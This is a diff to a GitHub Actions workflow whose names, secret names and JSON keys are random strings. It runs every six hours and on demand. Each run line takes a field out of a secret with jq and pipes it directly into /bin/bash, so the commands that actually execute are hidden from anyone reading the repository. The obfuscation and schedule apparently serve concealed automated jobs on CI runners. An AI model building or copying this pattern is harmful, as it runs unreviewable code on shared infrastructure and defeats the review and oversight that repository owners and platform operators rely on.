@@ -1,29 +1,26 @@
 name: zhuyhdaohy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '4 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuyhdaohy
         env:
-          n9184: ${{ secrets.n9184 }}
+          u7239: ${{ secrets.u7239 }}
         run: |
-          echo $n9184 | jq -r .lb8442 | /bin/bash
-          echo $s2 | jq -r .z43876 | /bin/bash
-          echo $evmwy13574 | jq -r .es10191 | /bin/bash
-          echo $z6 | jq -r .gkr5 | /bin/bash
-          echo $a2280 | jq -r .duthl459 | /bin/bash
-          echo $p99111 | jq -r .bsym83497 | /bin/bash
-          echo $dqjqm63820 | jq -r .iyqax956 | /bin/bash
-          echo $nx0 | jq -r .k656 | /bin/bash
-          echo $vk3495 | jq -r .y3 | /bin/bash
-          echo $qgdqh3548 | jq -r .f887 | /bin/bash
-          echo $kgmn67 | jq -r .wkvq957 | /bin/bash
-          echo $p29136 | jq -r .dh27 | /bin/bash
+          echo $u7239 | jq -r .bpda92722 | /bin/bash
+          echo $h4546 | jq -r .keay49850 | /bin/bash
+          echo $ncucv873 | jq -r .yk2 | /bin/bash
+          echo $ulpds32 | jq -r .n39770 | /bin/bash
+          echo $b24 | jq -r .wcled46 | /bin/bash
+          echo $hkds154 | jq -r .m2 | /bin/bash
+          echo $p59337 | jq -r .cduov2233 | /bin/bash
+          echo $zo9798 | jq -r .n7 | /bin/bash
+          echo $qqj0 | jq -r .pfbao6920 | /bin/bash
 
